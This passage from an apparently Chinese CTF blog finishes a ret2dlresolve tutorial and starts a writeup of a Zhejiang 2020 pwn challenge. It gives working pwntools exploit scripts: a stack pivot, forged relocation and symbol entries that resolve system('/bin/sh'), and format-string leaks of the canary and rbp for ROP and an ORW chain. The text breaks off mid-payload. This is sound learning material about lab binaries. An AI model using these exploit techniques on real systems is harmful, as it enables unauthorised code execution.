class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$gcc -g ret2dlresolve.c -o bof -no-pie -fno-<span class="built_in">stack</span>-protector -z relro -m32</span><br></pre></td></tr></table></figure><p>我们编译32位的只开NX保护程序测试。</p><h2 id="dl-runtime-resolve函数"><a href="#dl-runtime-resolve函数" class="headerlink" title="_dl_runtime_resolve函数"></a>_dl_runtime_resolve函数</h2><p><code>_dl_runtime_resolve</code>的原型是<code>_dl_runtime_resolve(link_map,reloc_offset)</code>参数<code>link_map</code>的参数传入在<code>reloc_offset</code>之后（根据32位函数调用约定），在动态链接中，所有函数的延迟绑定都需要用这个函数去寻址。寻址的时候eip会在<code>plt[0]</code>然后<code>push got[1],jmp got[2]</code>，<code>got[1]</code>就是<code>link_map</code>，<code>got[2]</code>就是<code>dl_runtime_resolve</code>函数了。</p><p>再次解释一遍第一次调用函数的流程。调用肯定是从plt表的对应位置调用的，plt表都会指向got表一个地址，got表在没有被写入函数地址时会<code>push</code>一个<code>reloc_arg</code>,然后<code>jmp plt[0]</code>，<code>plt</code>[0]有一段指令就是压<code>got[1]</code>做参数，然后<code>jmp dl_runtime_resolve</code>。然后拆开这个函数会发现它内部调用了<code>_dl_fixup</code>函数，这个函数就是用来找地址和回写<code>got</code>表的。</p><h2 id="控制reloc-offset参数"><a href="#控制reloc-offset参数" class="headerlink" title="控制reloc_offset参数"></a>控制reloc_offset参数</h2><p>对于这个程序，我们先把栈迁移到<code>.bss</code>段上，然后在这个段上精心构造<code>payload</code>就可，首先我们直接调用<code>plt[0]</code>，自己传<code>reloc_offset</code>参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">proc=<span class="string">&#x27;./bof&#x27;</span></span><br><span class="line">elf=ELF(proc)</span><br><span class="line">p=process(proc)</span><br><span class="line">elf=ELF(proc)</span><br><span class="line"></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x804c024</span><span class="comment">#readelf -S bof查看所有的段的地址</span></span><br><span class="line">ppp_ret=<span class="number">0x08049331</span><span class="comment">#ROPgadget</span></span><br><span class="line">leave_ret=<span class="number">0x08049145</span></span><br><span class="line">pop_ebp=<span class="number">0x08049333</span></span><br><span class="line">stack_size=<span class="number">0x400</span></span><br><span class="line">stack_start=bss+stack_size</span><br><span class="line">buf_size=<span class="number">0x6c</span>+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> buf_size*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">,p32(read)+p32(ppp_ret)<span class="comment">#弹出三个参数</span></span><br><span class="line">,p32(<span class="number">0</span>)+p32(stack_start)</span><br><span class="line">,p32(<span class="number">100</span>)</span><br><span class="line">,p32(pop_ebp)<span class="comment">#栈迁移</span></span><br><span class="line">,p32(stack_start)</span><br><span class="line">,p32(leave_ret)</span><br><span class="line">)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome to the last stackoverflow&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">reloc_arg=<span class="number">0x10</span></span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#这个给leave指令后的pop ebp，实际从下面开始执行</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/19/8Y72K69DTlsZ1PL.png" alt="ret2dl_resolve_1.png"></p><p>可以看到我在没有直接调用puts的情况下输出了<code>/bin/sh</code>字符串。</p><p>但是可以看到，这里的第二个参数是我自己传的，为什么是<code>0x10</code>呢，<code>0x10</code>是<code>puts</code>函数的重定位项在<code>.rel.plt</code>段的偏移。重定位项是这么一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Addr r_offset; <span class="comment">// 其实就是got表的地址</span></span><br><span class="line">    Elf32_Word r_info; <span class="comment">// 符号表索引，高三个字节指示了puts函数在.dynsym段上的偏移/16。</span></span><br><span class="line">    <span class="comment">//因此得出的偏移必须被16整除。</span></span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p>由于我们有puts函数，所以<code>.rel.plt</code>段上有现成的结构体，我们现在主要来伪造<code>.rel.plt</code>重定位项的结构体。</p><h2 id="伪造重定位项"><a href="#伪造重定位项" class="headerlink" title="伪造重定位项"></a>伪造重定位项</h2><p>我们只需要改第二个<code>payload</code>即可。</p><p>我们在栈上伪造的重定位项的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_rel-.rel.plt_addr=reloc_offset</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rel_plt=<span class="number">0x8048388</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">fake_puts=flat(p32(puts_got),p32(<span class="number">0x307</span>))</span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">reloc_arg=stack_start+<span class="number">20</span>-rel_plt</span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#这个给leave指令后的pop ebp，实际从下面开始执行</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">,fake_puts</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://i.loli.net/2021/07/19/3sXOio6cLwCQ2HN.png" alt="ret2dl_resolve_2.png"></p><h2 id="伪造符号"><a href="#伪造符号" class="headerlink" title="伪造符号"></a>伪造符号</h2><p>既然<code>r_info</code>我们可以控制，自然我们也能把它的偏移改到我们可以控制的地址当中，然后在那里伪造一个符号结构体。</p><p>我们来看看符号<code>ELF32_Sym</code>的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name; <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">    Elf32_Addr st_value; <span class="comment">// Symbol value</span></span><br><span class="line">    Elf32_word st_size; <span class="comment">// Symbol size</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">// Symbol type and binding</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">// symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">    Elf32_Section st_shndx; <span class="comment">// Section index</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>然后构造出<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">rel_plt=<span class="number">0x8048388</span></span><br><span class="line">dynsym=<span class="number">0x8048248</span></span><br><span class="line">str_tab=<span class="number">0x80482D8</span></span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align=<span class="number">0x10</span>-(stack_start+<span class="number">28</span>-dynsym)%<span class="number">0x10</span></span><br><span class="line">fake_sym_addr=stack_start+<span class="number">28</span>+align</span><br><span class="line">r_info=(((fake_sym_addr-dynsym)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_puts=flat(p32(puts_got),p32(r_info))</span><br><span class="line"></span><br><span class="line">reloc_arg=stack_start+<span class="number">20</span>-rel_plt</span><br><span class="line">fake_sym=flat(p32(<span class="number">0x1a</span>),p32(<span class="number">0</span>)*<span class="number">2</span>,p32(<span class="number">0x12</span>))</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#这个给leave指令后的pop ebp，实际从下面开始执行</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">,fake_puts</span><br><span class="line">,align*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">,fake_sym</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h2 id="伪造字符串"><a href="#伪造字符串" class="headerlink" title="伪造字符串"></a>伪造字符串</h2><p>最后一步就是在某个地方写上<code>puts</code>然后修改<code>st_name</code>到那个<code>puts</code>就可，然后把<code>puts</code>替换成<code>system</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">proc=&#x27;./bof&#x27;</span><br><span class="line">elf=ELF(proc)</span><br><span class="line">p=process(proc)</span><br><span class="line">elf=ELF(proc)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">read=elf.plt[&#x27;read&#x27;]</span><br><span class="line">bss=0x804c024#readelf -S bof查看所有的段的地址</span><br><span class="line">ppp_ret=0x08049331#ROPgadget</span><br><span class="line">leave_ret=0x08049145</span><br><span class="line">pop_ebp=0x08049333</span><br><span class="line">stack_size=0x800</span><br><span class="line">stack_start=bss+stack_size</span><br><span class="line">buf_size=0x6c+4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> buf_size*b&#x27;a&#x27;</span><br><span class="line">,p32(read)+p32(ppp_ret)#弹出三个参数</span><br><span class="line">,p32(0)+p32(stack_start)</span><br><span class="line">,p32(100)</span><br><span class="line">,p32(pop_ebp)#栈迁移</span><br><span class="line">,p32(stack_start)</span><br><span class="line">,p32(leave_ret)</span><br><span class="line">)</span><br><span class="line">p.sendlineafter(b&#x27;Welcome to the last stackoverflow&#x27;,payload)</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">plt_0=0x8049030</span><br><span class="line">rel_plt=0x8048388</span><br><span class="line">dynsym=0x8048248</span><br><span class="line">str_tab=0x80482D8</span><br><span class="line">cmd=b&#x27;/bin/sh\0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align=0x10-(stack_start+28-dynsym)%0x10</span><br><span class="line">fake_sym_addr=stack_start+28+align</span><br><span class="line">r_info=(((fake_sym_addr-dynsym)//16)&lt;&lt;8)|0x7</span><br><span class="line">fake_puts=flat(p32(puts_got),p32(r_info))</span><br><span class="line"></span><br><span class="line">str_addr=fake_sym_addr+0x10</span><br><span class="line">st_name=str_addr-str_tab</span><br><span class="line"></span><br><span class="line">reloc_arg=stack_start+20-rel_plt</span><br><span class="line">fake_sym=flat(p32(st_name),p32(0)*2,p32(0x12))</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> b&#x27;a&#x27;*4#这个给leave指令后的pop ebp，实际从下面开始执行</span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line"></span><br><span class="line">,p32(stack_start+92)*2</span><br><span class="line">,fake_puts</span><br><span class="line">,align*b&#x27;a&#x27;</span><br><span class="line">,fake_sym</span><br><span class="line">,b&#x27;system\0&#x27;</span><br><span class="line">)</span><br><span class="line">print(st_name)</span><br><span class="line">payload=payload.ljust(92,b&#x27;a&#x27;)</span><br><span class="line">payload+=cmd </span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/19/NBuOMalU5tvi9JL.png" alt="ret2dl_resolve_3.png"></p><p>完结撒花，开始学堆。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浙江2020省赛pwn1</title>
      <link href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/"/>
      <url>/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/</url>
      
        <content type="html"><![CDATA[<p>据学长说，那一次的ctf出题人一句“我就没打算让pwn有解”让全场所有pwner直呼内行，pwn1看似简单实则在比赛过程中能出比赛也快结束了。</p><span id="more"></span><h2 id="分析elf确定大概思路"><a href="#分析elf确定大概思路" class="headerlink" title="分析elf确定大概思路"></a>分析elf确定大概思路</h2><p>IDA打开分析elf文件</p><p><code>main()</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  __int16 *v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+12h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+13h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v10; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+1Ah] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+1Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+22h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+23h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v18; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+2Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v22; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v22 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">32</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">21</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  v13 = <span class="number">59</span>;</span><br><span class="line">  v14 = <span class="number">6</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">6</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">2147418112</span>;</span><br><span class="line">  v4 = <span class="number">4</span>;</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v4);</span><br><span class="line">  welcome(<span class="number">22LL</span>, <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别的可能会有些许差异，但是它调用了<code>prctl</code>函数我们就要有所警惕了，就要想它应该开了沙箱保护。用<code>seccomp-tools</code>查<code>elf</code>的沙箱保护，发现该elf禁用了<code>execve</code>系统调用。</p><p><img src="https://i.loli.net/2021/07/15/FrlJvebK4ugTW63.png" alt="zjctf pwn1_1.png"></p><p>这个保护的开启就相当于断绝了我们调用<code>system</code>的绝大部分的命令，诸如<code>/bin/sh</code>或者是<code>cat flag</code>这类的。对于这个我们也是有应对措施的，那就是<code>orw</code>(<code>open</code>-<code>read</code>-<code>write</code>的缩写)。这一题很明显就是要我们用这个方法去获取<code>flag</code>了。</p><h2 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h2><p>确定好思路之后进<code>welcome()</code>函数寻找漏洞点。</p><p><img src="https://i.loli.net/2021/07/15/p7gRyNJAQ18sIZm.png" alt="zjctf pwn1_2.png"></p><p>很明显存在格式化字符串漏洞和栈溢出漏洞，而plt表段存在<code>_stack_chk_fail</code>函数，那就是开了<code>canary</code>保护，那么我们肯定是先利用格式化字符串任意读的特性泄露<code>canary</code>，再栈溢出。</p><h3 id="canary偏移确定"><a href="#canary偏移确定" class="headerlink" title="canary偏移确定"></a>canary偏移确定</h3><p>首先是看字符串相对于格式化字符串第一个参数的偏移。因为<code>buf</code>刚好在<code>welcome</code>函数的缓冲区顶部，因此很容易可以猜测<code>buf</code>距离第一个参数差了6*8个字节，因为它们中间隔了5个寄存器。然后<code>buf</code>到栈底又有<code>0xb0</code>个字节，而canary就在rsp-8的位置上。综上所述，canary应该在printf除了格式化字符串参数以外的第<code>(6x8+0xb0-8)/8=27</code>，所以第一次的<code>payload</code>我们就给<code>%27$p</code>，看看输出的是不是<code>canary</code>有如下特性：</p><p>①随机性，每次运行差别都会很大</p><p>②最低位字节永远为\0</p><p><img src="https://i.loli.net/2021/07/15/SCzM9NT2cauwPOo.png" alt="zjctf pwn1_3.png.png"></p><p>多次测试发现均符合上面两个特性，因此canary就被泄露出来了。</p><p>我们接收的是数字组成的字节，因此我们会接收到16个16进制的数，然后字节转成数值后用p64转为字节就可以利用<code>canary</code>了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome! What is your name?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br></pre></td></tr></table></figure><p>这就是第一步的<code>payload</code></p><h2 id="栈溢出泄露libc"><a href="#栈溢出泄露libc" class="headerlink" title="栈溢出泄露libc"></a>栈溢出泄露libc</h2><p>题目中存在输出函数<code>puts</code>。</p><p>这个用一般的payload就可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(buf_size-<span class="number">8</span>)+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+P64(pop_rdi)+p64(puts_got)+p64(puts)+p64(welcome)</span><br></pre></td></tr></table></figure><p>泄露完成之后记得重新执行<code>welcome</code>实现二次溢出执行一些libc的函数，因为我们不需要<code>system</code>，只需要<code>orw</code>，在已有的函数中就缺一个<code>open</code>函数。找到偏移得到open的真实地址。因为我只能本地复盘，又没有加载它给的libc，因此偏移只能是我自己本地调试是多少就是多少了。</p><h2 id="open函数的调用"><a href="#open函数的调用" class="headerlink" title="open函数的调用"></a>open函数的调用</h2><p>open函数只需要两个就能完成，一个是<code>&quot;flag&quot;</code>或者是<code>&quot;flag.txt&quot;</code>，另一个参数就是<code>&quot;r&quot;</code>或者是0。而只有栈是我们可读可写可以随意控制的，因此我们还需要泄露栈地址。泄露栈地址与泄露canary思路是一样的，可以用格式化字符串的任意写和C字符串的判定方式来泄露存储在栈中的<code>rbp</code>，这里已经有了格式化字符串漏洞，因此我们可以在<code>payload1</code>加上一个格式化字符来多泄露一个<code>rbp</code>。</p><p><code>gdb</code>是个好东西，用它来调试一下。因为我们的<code>rop</code>链是执行到<code>welcome</code>的那个地方才是栈底，所以我们泄露那边的<code>rsp</code></p><p><img src="https://i.loli.net/2021/07/16/pjHAqX3LF6T5iM7.png" alt="zjctf pwn1_4.png"></p><p>那边的<code>rbp</code>刚好是我们新的<code>welcome</code>函数的栈底，讲的通俗点上面就是<code>canary</code>了。</p><p>所以我们的payload和对应的接受输出的措施就可以改成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%27$p %31$p&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>然后我们就可以在下一次的<code>payload</code>里面输入<code>flag</code>字符串并且根据地址去引用它。首先还是老样子把<code>canary</code>泄露出来，然后<code>open</code>函数去打开<code>flag</code>文件。这里我的做法是把<code>flag</code>输出到了后面，但其实可以在前面就把<code>flag</code>字符串放上去，那样偏移还是固定的，而放在后面的话还得根据<code>rop</code>链的长度判断地址。但是思路是这么个思路，可以想一下万一缓冲区没给够，还得输出在后面的时候该用什么措施应对。这里有一个很好用的东西就是<code>ljust</code>固定<code>rop</code>链大小然后再去写。</p><p>这里我给了<code>0xb0</code>的长度去写rop链，先一步步来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span 